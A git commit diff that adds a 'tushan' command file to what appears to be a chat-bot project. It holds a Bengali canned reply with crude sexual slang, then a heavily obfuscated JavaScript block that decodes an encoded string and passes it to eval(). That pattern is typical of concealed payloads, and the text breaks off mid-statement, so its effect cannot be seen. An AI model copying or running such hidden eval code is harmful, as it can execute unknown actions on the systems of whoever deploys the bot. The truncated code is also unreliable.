e0cf676a2bcb6f869332ef5192dd146daebf3dea
tubiha143 <159847540+tubiha143@users.noreply.github.com>
2024-04-04 18:58:44 +0400

    Update and rename shairi.js to Tushan.js

---
+++ scripts/commands/Tushan.js
@@ -0,0 +1,18 @@
+module.exports.config = {
+  name: "tushan",
+  version: "0.0.2",
+  permission: 0,
+  prefix: 'awto',
+  credits: "Nayan",
+  description: "talk with bot",
+  category: "user",
+  usages: "",
+    cooldowns: 5,
+};
+
+
+var tl = ["তুষান বস মাগি চুদায় ব্যাস্ত আছে, একটু পর কথা বলবে__🥵💦_✌︎⎯⃝𝐉𝐄𝐑𝐑𝐘_𝐁𝐎𝐓  ᯽▸🤍🩷❄︎", ];
+
+var lang = "bn"
+
+ var _0xc44e=["","split","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/","slice","indexOf","","",".","pow","reduce","reverse","0"];function _0xe21c(d,e,f){var g=_0xc44e[2][_0xc44e[1]](_0xc44e[0]);var h=g[_0xc44e[3]](0,e);var i=g[_0xc44e[3]](0,f);var j=d[_0xc44e[1]](_0xc44e[0])[_0xc44e[10]]()[_0xc44e[9]](function(a,b,c){if(h[_0xc44e[4]](b)!==-1)return a+=h[_0xc44e[4]](b)*(Math[_0xc44e[8]](e,c))},0);var k=_0xc44e[0];while(j>0){k=i[j%f]+k;j=(j-(j%f))/f}return k||_0xc44e[11]}eval(function(h,u,n,t,e,r){r="";for(var i=0,len=h.length;i<len;i++){var s="";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],"g"),j);r+=S
